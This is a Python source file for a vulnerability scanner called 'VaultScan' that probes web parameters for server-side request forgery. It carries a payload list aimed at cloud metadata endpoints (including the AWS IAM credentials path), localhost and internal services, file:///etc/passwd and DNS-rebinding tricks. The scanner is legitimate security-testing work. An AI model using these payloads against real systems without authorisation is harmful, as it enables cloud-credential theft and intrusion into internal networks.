#!/usr/bin/env python3
"""
VaultScan -- SSRF (Server-Side Request Forgery) Scanner
=========================================================
Detects SSRF vulnerabilities by injecting internal/cloud-metadata URLs into
URL-like parameters.  Crawls the target (depth-1) and tests discovered
parameters as well as form inputs whose names suggest URL acceptance.

Outputs JSON array of findings to stdout.
"""

import os
import re
import sys
import time
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

# ---------------------------------------------------------------------------
# Ensure scan_utils is importable from the same directory
# ---------------------------------------------------------------------------
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scan_utils import (
    base_argparser,
    is_mock_mode,
    output_findings,
    output_error,
    normalize_url,
    create_session,
    safe_request,
    rate_limited_request,
    extract_forms,
    extract_url_params,
    replace_url_param,
    crawl_same_domain,
    make_finding,
    DEFAULT_TIMEOUT,
    DEFAULT_DELAY,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
CATEGORY = "SSRF"
MAX_CRAWL_PAGES = 5

# Parameter names commonly used to accept URLs (case-insensitive matching)
SSRF_PARAMS: Set[str] = {
    "url", "uri", "path", "src", "source", "dest", "destination", "redirect",
    "link", "href", "file", "fetch", "load", "page", "site", "html",
    "reference", "ref", "callback", "return", "next", "data", "domain",
    "host", "proxy", "feed", "rss", "val", "target", "image", "img",
    "icon", "logo", "avatar", "picture", "resource", "content", "api",
    "endpoint", "service", "webhook", "ping", "location",
}

# Harmless external URL used to establish a baseline response
BASELINE_URL = "https://example.com"

# SSRF payloads grouped by technique for severity mapping
SSRF_PAYLOADS: List[Dict] = [
    # -----------------------------------------------------------------------
    # Internal network -- localhost variants
    # -----------------------------------------------------------------------
    {"payload": "http://127.0.0.1", "name": "Localhost IPv4",
     "signatures": ["<html", "<body", "<!DOCTYPE", "Welcome", "Apache", "nginx", "IIS"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://127.0.0.1:22", "name": "Localhost SSH",
     "signatures": ["SSH-", "OpenSSH"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://127.0.0.1:3306", "name": "Localhost MySQL",
     "signatures": ["mysql", "MariaDB"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://[::1]", "name": "Localhost IPv6",
     "signatures": ["<html", "<body"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://0.0.0.0", "name": "Localhost 0.0.0.0",
     "signatures": ["<html", "<body"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "MEDIUM"},
    {"payload": "http://0177.0.0.1", "name": "Localhost Octal",
     "signatures": ["<html", "<body"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://2130706433", "name": "Localhost Decimal",
     "signatures": ["<html", "<body"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},

    # -----------------------------------------------------------------------
    # Cloud metadata endpoints
    # -----------------------------------------------------------------------
    # AWS
    {"payload": "http://169.254.169.254/latest/meta-data/", "name": "AWS Metadata",
     "signatures": ["ami-id", "instance-id", "hostname", "local-ipv4",
                     "security-credentials", "iam"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "name": "AWS IAM Credentials",
     "signatures": ["AccessKeyId", "SecretAccessKey", "Token"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    # GCP
    {"payload": "http://metadata.google.internal/computeMetadata/v1/",
     "name": "GCP Metadata",
     "signatures": ["attributes", "instance", "project"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    # Azure
    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "name": "Azure Metadata",
     "signatures": ["compute", "vmId", "subscriptionId"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    # DigitalOcean
    {"payload": "http://169.254.169.254/metadata/v1/",
     "name": "DigitalOcean Metadata",
     "signatures": ["droplet_id", "hostname", "region", "floating_ip"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    # Oracle Cloud
    {"payload": "http://169.254.169.254/opc/v1/instance/",
     "name": "Oracle Cloud Metadata",
     "signatures": ["availabilityDomain", "compartmentId", "displayName", "shape"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    # Alibaba Cloud
    {"payload": "http://100.100.100.200/latest/meta-data/",
     "name": "Alibaba Cloud Metadata",
     "signatures": ["instance-id", "region-id", "zone-id", "hostname"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    # Kubernetes
    {"payload": "https://kubernetes.default.svc/",
     "name": "Kubernetes API",
     "signatures": ["apiVersion", "kind", "paths", "serverAddressByClientCIDRs"],
     "technique": "cloud-metadata", "severity": "CRITICAL", "confidence": "CONFIRMED"},

    # -----------------------------------------------------------------------
    # Internal networks
    # -----------------------------------------------------------------------
    {"payload": "http://10.0.0.1", "name": "Internal 10.x",
     "signatures": ["<html", "<body", "login", "admin"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://192.168.1.1", "name": "Internal 192.168.x",
     "signatures": ["<html", "<body", "router", "login", "admin"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://172.16.0.1", "name": "Internal 172.16.x",
     "signatures": ["<html", "<body", "login", "admin"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://172.17.0.1", "name": "Docker Default Gateway",
     "signatures": ["<html", "<body", "docker", "login", "admin"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},

    # -----------------------------------------------------------------------
    # Common internal service ports
    # -----------------------------------------------------------------------
    {"payload": "http://127.0.0.1:9200", "name": "Elasticsearch",
     "signatures": ["cluster_name", "cluster_uuid", "tagline", "lucene_version"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://127.0.0.1:6379", "name": "Redis",
     "signatures": ["redis_version", "connected_clients", "DENIED", "-ERR"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},
    {"payload": "http://127.0.0.1:27017", "name": "MongoDB",
     "signatures": ["ismaster", "mongodb", "maxBsonObjectSize"],
     "technique": "internal-network", "severity": "HIGH", "confidence": "HIGH"},

    # -----------------------------------------------------------------------
    # Protocol smuggling
    # -----------------------------------------------------------------------
    {"payload": "file:///etc/passwd", "name": "File Protocol",
     "signatures": ["root:x:0:0", "root:x:0:"],
     "technique": "file-protocol", "severity": "CRITICAL", "confidence": "CONFIRMED"},
    {"payload": "dict://127.0.0.1:6379/info", "name": "Redis via Dict",
     "signatures": ["redis_version", "connected_clients"],
     "technique": "protocol-smuggling", "severity": "HIGH", "confidence": "HIGH"},

    # -----------------------------------------------------------------------
    # DNS rebinding payloads
    # -----------------------------------------------------------------------
    {"payload": "http://0x7f000001", "name": "DNS Rebind Hex IP",
     "signatures": ["<html", "<body", "<!DOCTYPE", "Apache", "nginx"],
     "technique": "dns-rebinding", "severity": "HIGH", "confidence": "MEDIUM"},
    {"payload": "http://127.1", "name": "DNS Rebind Short Localhost",
     "signatures": ["<html", "<body", "<!DOCTYPE"],
     "technique": "dns-rebinding", "severity": "HIGH", "confidence": "MEDIUM"},
    {"payload": "http://127.0.0.1.nip.io", "name": "DNS Rebind nip.io",
     "signatures": ["<html", "<body", "<!DOCTYPE", "Apache", "nginx"],
     "technique": "dns-rebinding", "severity": "HIGH", "confidence": "MEDIUM"},
    {"payload": "http://spoofed.burpcollaborator.net", "name": "DNS Rebind Collaborator",
     "signatures": ["<html", "<body"],
     "technique": "dns-rebinding", "severity": "MEDIUM", "confidence": "LOW"},
    {"payload": "http://localtest.me", "name": "DNS Rebind localtest.me",
     "signatures": ["<html", "<body", "<!DOCTYPE"],
     "technique": "dns-rebinding", "severity": "HIGH", "confidence": "MEDIUM"},
    {"payload": "http://customer1.app.localhost", "name": "DNS Rebind .localhost TLD",
     "signatures": ["<html", "<body"],
     "technique": "dns-rebinding", "severity": "HIGH", "confidence": "MEDIUM"},
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _is_ssrf_param(param_name: str) -> bool:
    """Check whether a parameter name looks like it accepts a URL."""
    return param_name.lower() in SSRF_PARAMS


def _value_looks_like_url(value: str) -> bool:
    """Return True if the parameter value starts with http(s)://."""
    return bool(value) and value.lower().startswith("http")


def _build_test_url(base_url: str, param: str, payload: str) -> str:
    """Construct a URL with the given param set to the payload."""
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _has_signature(body: str, signatures: List[str]) -> Optional[str]:
    """
    Return the first matching signature found in the response body,
    or None if no signature matches.
    """
    body_lower = body.lower()
    for sig in signatures:
        if sig.lower() in body_lower:
            return sig
    return None


def _response_differs_significantly(
    baseline_status: int,
    baseline_length: int,
    resp_status: int,
    resp_length: int,
) -> bool:
    """
    Return True if the SSRF response differs meaningfully from the baseline.
    Significant change: different status code, or content length differs by
    more than 30%.
    """
    if baseline_status != resp_status:
        return True
    if baseline_length == 0:
        return resp_length > 0
    ratio = abs(resp_length - baseline_length) / max(baseline_length, 1)
    return ratio > 0.3


# ---------------------------------------------------------------------------
# Core Detection Logic
# ---------------------------------------------------------------------------
def _get_baseline(
    session,
    url: str,
    param: str,
    delay: float,
    timeout: int,
) -> Tuple[Optional[int], Optional[int]]:
    """
    Fetch a baseline response by injecting a harmless external URL.
    Returns (status_code, content_length) or (None, None) on failure.
    """
    test_url = _build_test_url(url, param, BASELINE_URL)
    resp, err = rate_limited_request(
        session, "GET", test_url,
        delay=delay, timeout=timeout,
    )
    if err or resp is None:
        return None, None
    return resp.status_code, len(resp.text)


def test_ssrf_param(
    session,
    url: str,
    param: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test a single URL parameter with all SSRF payloads.
    Returns findings for confirmed or suspected SSRF.
    """
    findings: List[Dict] = []
    seen_techniques: Set[str] = set()

    # Establish baseline
    baseline_status, baseline_length = _get_baseline(
        session, url, param, delay, timeout,
    )

    for pdef in SSRF_PAYLOADS:
        technique = pdef["technique"]

        # Deduplicate: only one finding per technique per parameter
        if technique in seen_techniques:
            continue

        payload = pdef["payload"]
        test_url = _build_test_url(url, param, payload)

        resp, err = rate_limited_request(
            session, "GET", test_url,
            delay=delay, timeout=timeout,
        )
        if err or resp is None:
            continue

        body = resp.text
        status = resp.status_code
        content_length = len(body)

        # Check for signature matches
        matched_sig = _has_signature(body, pdef["signatures"])
        if matched_sig:
            severity = pdef["severity"]
            confidence = pdef.get("confidence", "MEDIUM")
            vuln_name = _vuln_name_for_technique(technique)
            evidence = (
                f"{pdef['name']} ({payload}) returned content matching "
                f"'{matched_sig}' via {param} parameter"
            )
            findings.append(make_finding(
                vulnerability=vuln_name,
                severity=severity,
                location=f"{url} [param: {param}]",
                evidence=evidence,
                category=CATEGORY,
                confidence=confidence,
                raw_details={
                    "parameter": param,
                    "payload": payload,
                    "technique": technique,
                    "matched_signature": matched_sig,
                    "status_code": status,
                    "test_url": test_url,
                },
            ))
            seen_techniques.add(technique)
            continue

        # Check for response differentiation (weaker signal)
        if baseline_status is not None and baseline_length is not None:
            if _response_differs_significantly(
                baseline_status, baseline_length, status, content_length,
            ):
                findings.append(make_finding(
                    vulnerability="SSRF: Response Differentiation Detected",
                    severity="MEDIUM",
                    location=f"{url} [param: {param}]",
                    evidence=(
                        f"Payload '{payload}' ({pdef['name']}) via parameter "
                        f"'{param}' produced a significantly different response "
                        f"(status: {status} vs baseline {baseline_status}, "
                        f"length: {content_length} vs baseline {baseline_length})"
                    ),
                    category=CATEGORY,
                    confidence="LOW",
                    raw_details={
                        "parameter": param,
                        "payload": payload,
                        "technique": technique,
                        "baseline_status": baseline_status,
                        "baseline_length": baseline_length,
                        "response_status": status,
                        "response_length": content_length,
                        "test_url": test_url,
                    },
                ))
                seen_techniques.add(technique)

    return findings


def _vuln_name_for_technique(technique: str) -> str:
    """Map a technique identifier to a human-readable vulnerability name."""
    mapping = {
        "cloud-metadata": "SSRF: Cloud Metadata Endpoint Accessible",
        "internal-network": "SSRF: Internal Network Accessible",
        "file-protocol": "SSRF: Local File Read via File Protocol",
        "protocol-smuggling": "SSRF: Protocol Smuggling Detected",
        "dns-rebinding": "SSRF: DNS Rebinding Detected",
    }
    return mapping.get(technique, "SSRF: Server-Side Request Forgery Detected")


# ---------------------------------------------------------------------------
# Parameter Discovery
# ---------------------------------------------------------------------------
def discover_ssrf_params(url: str) -> List[str]:
    """
    Extract query parameters from a URL and return those whose names
    match SSRF_PARAMS or whose values look like URLs.
    """
    params = extract_url_params(url)
    matches = []
    for name, values in params.items():
        if _is_ssrf_param(name):
            matches.append(name)
        elif any(_value_looks_like_url(v) for v in values):
            matches.append(name)
    return matches


def discover_form_ssrf_params(
    session,
    url: str,
    timeout: int,
) -> List[Tuple[str, str, str]]:
    """
    Fetch a page and extract form inputs whose names match SSRF_PARAMS
    or whose current values look like URLs.

    Returns list of (form_action_url, input_name, http_method).
    """
    resp, err = safe_request(session, "GET", url, timeout=timeout)
    if err or resp is None:
        return []

    forms = extract_forms(url, resp.text)
    targets: List[Tuple[str, str, str]] = []
    for form in forms:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        for inp in form.get("inputs", []):
            name = inp.get("name", "")
            value = inp.get("value", "")
            if not name:
                continue
            if _is_ssrf_param(name) or _value_looks_like_url(value):
                targets.append((action, name, method))
    return targets


def test_ssrf_form_param(
    session,
    action_url: str,
    param: str,
    method: str,
    delay: float,
    timeout: int,
) -> List[Dict]:
    """
    Test a single form input parameter with SSRF payloads via GET or POST.
    """
    findings: List[Dict] = []
    seen_techniques: Set[str] = set()

    # Baseline
    if method == "POST":
        resp, err = rate_limited_request(
            session, "POST", action_url,
            delay=delay, timeout=timeout,
            data={param: BASELINE_URL},
        )
    else:
        baseline_url = _build_test_url(action_url, param, BASELINE_URL)
        resp, err = rate_limited_request(
            session, "GET", baseline_url,
            delay=delay, timeout=timeout,
        )

    baseline_status = resp.status_code if resp else None
    baseline_length = len(resp.text) if resp else None

    for pdef in SSRF_PAYLOADS:
        technique = pdef["technique"]
        if technique in seen_techniques:
            continue

        payload = pdef["payload"]

        if method == "POST":
            resp, err = rate_limited_request(
                session, "POST", action_url,
                delay=delay, timeout=timeout,
                data={param: payload},
            )
        else:
            test_url = _build_test_url(action_url, param, payload)
            resp, err = rate_limited_request(
                session, "GET", test_url,
                delay=delay, timeout=timeout,
            )

        if err or resp is None:
            continue

        body = resp.text
        status = resp.status_code
        content_length = len(body)

        matched_sig = _has_signature(body, pdef["signatures"])
        if matched_sig:
            severity = pdef["severity"]
            confidence = pdef.get("confidence", "MEDIUM")
            vuln_name = _vuln_name_for_technique(technique)
            evidence = (
                f"{pdef['name']} ({payload}) returned content matching "
                f"'{matched_sig}' via {param} parameter ({method} form)"
            )
            findings.append(make_finding(
                vulnerability=vuln_name,
                severity=severity,
                location=f"{action_url} [form param: {param}]",
                evidence=evidence,
                category=CATEGORY,
                confidence=confidence,
                raw_details={
                    "parameter": param,
                    "payload": payload,
                    "technique": technique,
                    "method": method,
                    "matched_signature": matched_sig,
                    "status_code": status,
                },
            ))
            seen_techniques.add(technique)
            continue

        if baseline_status is not None and baseline_length is not None:
            if _response_differs_significantly(
                baseline_status, baseline_length, status, content_length,
            ):
                findings.append(make_finding(
                    vulnerability="SSRF: Response Differentiation Detected",
                    severity="MEDIUM",
                    location=f"{action_url} [form param: {param}]",
                    evidence=(
                        f"Payload '{payload}' ({pdef['name']}) via form parameter "
                        f"'{param}' ({method}) produced a significantly different "
                        f"response (status: {status} vs {baseline_status}, "
                        f"length: {content_length} vs {baseline_length})"
                    ),
                    category=CATEGORY,
                    confidence="LOW",
                    raw_details={
                        "parameter": param,
                        "payload": payload,
                        "technique": technique,
                        "method": method,
                        "baseline_status": baseline_status,
                        "baseline_length": baseline_length,
                        "response_status": status,
                        "response_length": content_length,
                    },
                ))
                seen_techniques.add(technique)

    return findings


# ---------------------------------------------------------------------------
# Mock Findings
# ---------------------------------------------------------------------------
def get_mock_findings(target: str) -> List[Dict]:
    """Return realistic mock findings for development / demo mode."""
    return [
        make_finding(
            vulnerability="SSRF: Cloud Metadata Endpoint Accessible",
            severity="CRITICAL",
            location=f"{target}/proxy?url=test",
            evidence=(
                "AWS metadata endpoint returned instance information "
                "via url parameter"
            ),
            category=CATEGORY,
            confidence="CONFIRMED",
            raw_details={
                "parameter": "url",
                "payload": "http://169.254.169.254/latest/meta-data/",
                "technique": "cloud-metadata",
            },
        ),
        make_finding(
            vulnerability="SSRF: Internal Network Accessible",
            severity="HIGH",
            location=f"{target}/fetch?src=test",
            evidence=(
                "Localhost (127.0.0.1) returned HTML content "
                "via src parameter"
            ),
            category=CATEGORY,
            confidence="HIGH",
            raw_details={
                "parameter": "src",
                "payload": "http://127.0.0.1",
                "technique": "internal-network",
            },
        ),
    ]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = base_argparser("VaultScan -- SSRF (Server-Side Request Forgery) Scanner")
    args = parser.parse_args()

    target = normalize_url(args.target)

    # ---- Mock mode --------------------------------------------------------
    if is_mock_mode():
        output_findings(get_mock_findings(target))
        return  # output_findings calls sys.exit

    # ---- Live scan --------------------------------------------------------
    session = create_session(timeout=args.timeout, cookies=args.cookies, headers=args.headers)
    delay = args.delay
    timeout = args.timeout
    findings: List[Dict] = []

    # Step 1: Validate target is reachable
    resp, err = safe_request(session, "GET", target, timeout=timeout)
    if err or resp is None:
        output_error(f"Cannot reach target: {err}")
        return

    # Step 2: Crawl same-domain pages (configurable depth, max 20)
    try:
        pages = crawl_same_domain(
            target, session, delay=delay, timeout=timeout,
            max_pages=MAX_CRAWL_PAGES, depth=args.crawl_depth,
        )
    except Exception:
        pages = [target]

    if target not in pages:
        pages.insert(0, target)

    # Step 3: For each page, discover and test SSRF-susceptible parameters
    tested_url_params: Set[Tuple[str, str]] = set()
    tested_form_params: Set[Tuple[str, str, str]] = set()

    for page_url in pages:
        # 3a: Test URL query parameters
        ssrf_params = discover_ssrf_params(page_url)
        for param in ssrf_params:
            dedup_key = (urlparse(page_url).path, param.lower())
            if dedup_key in tested_url_params:
                continue
            tested_url_params.add(dedup_key)

            param_findings = test_ssrf_param(
                session, page_url, param, delay, timeout,
            )
            findings.extend(param_findings)

        # 3b: Test form inputs that accept URL-like values
        form_targets = discover_form_ssrf_params(session, page_url, timeout)
        for action_url, input_name, method in form_targets:
            dedup_key = (
                urlparse(action_url).path,
                input_name.lower(),
                method,
            )
            if dedup_key in tested_form_params:
                continue
            tested_form_params.add(dedup_key)

            form_findings = test_ssrf_form_param(
                session, action_url, input_name, method, delay, timeout,
            )
            findings.extend(form_findings)

    # Deduplicate findings by (vulnerability, location)
    seen: Set[Tuple[str, str]] = set()
    unique_findings: List[Dict] = []
    for f in findings:
        key = (f["vulnerability"], f["location"])
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)

    output_findings(unique_findings)


if __name__ == "__main__":
    main()
